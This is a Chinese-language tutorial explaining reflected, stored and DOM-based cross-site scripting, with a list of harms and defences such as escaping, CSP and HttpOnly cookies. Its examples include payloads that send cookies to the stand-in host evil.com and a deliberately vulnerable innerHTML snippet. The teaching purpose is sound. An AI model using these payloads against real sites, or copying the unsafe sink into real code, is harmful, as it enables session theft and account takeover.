## XSS（Cross-Site Scripting，跨站脚本攻击）

XSS的本质是：**攻击者将恶意脚本注入到受信任的网页中，使其在其他用户的浏览器上执行。**

---

### 三种类型

**1. 反射型 XSS（Reflected）**

恶意脚本包含在URL中，服务器将其"反射"回响应页面，不存储。

```
攻击者构造恶意URL：
https://example.com/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>

受害者点击该链接 → 服务器将q参数直接输出到HTML → 脚本在受害者浏览器执行
```

特点：需要诱导用户点击链接，一次性。

---

**2. 存储型 XSS（Stored）**

恶意脚本被持久化存储到服务器数据库（评论、帖子、用户名等），所有访问该页面的用户都会中招。

```
攻击者在评论框提交：
<script>fetch('http://evil.com/steal?c='+document.cookie)</script>

服务器存储 → 所有访问该评论的用户浏览器执行该脚本
```

危害最大，可大规模批量攻击。

---

**3. DOM型 XSS（DOM-based）**

漏洞在客户端JS代码中，服务器响应本身无问题，但前端脚本将URL参数直接写入DOM。

```javascript
// 漏洞代码
document.getElementById('output').innerHTML = location.search.split('q=')[1];

// 攻击URL
https://example.com/#q=<img src=x onerror=alert(document.cookie)>
```

整个攻击链不经过服务器，服务器日志无记录，难以检测。

---

### 能做什么（危害）

|目标|手段|
|---|---|
|窃取Cookie/Session|`document.cookie` 外传|
|账户劫持|伪造请求（配合CSRF）|
|键盘记录|监听`keydown`事件|
|页面钓鱼|篡改DOM伪造登录框|
|传播蠕虫|存储型XSS自动扩散|

---

### 防御手段

**输入过滤** — 对用户输入做白名单校验，拒绝`<script>`等危险标签。

**输出转义** — 将特殊字符转义后再输出到HTML：

```
< → &lt;    > → &gt;    " → &quot;    ' → &#x27;
```

**CSP（Content Security Policy）** — HTTP响应头限制页面可执行脚本的来源：

```
Content-Security-Policy: script-src 'self'
```

即使注入成功，外部脚本也无法执行。

**HttpOnly Cookie** — 设置`HttpOnly`标志，JS无法通过`document.cookie`读取，阻断最常见的利用路径。

**现代框架** — React/Vue等框架默认对插值内容转义，从架构层规避大部分XSS风险。

---

### 一句话总结

XSS的根因是**将用户输入混入可执行上下文而未做隔离**，防御核心是**不信任任何用户输入，输出时严格转义，配合CSP纵深防御**。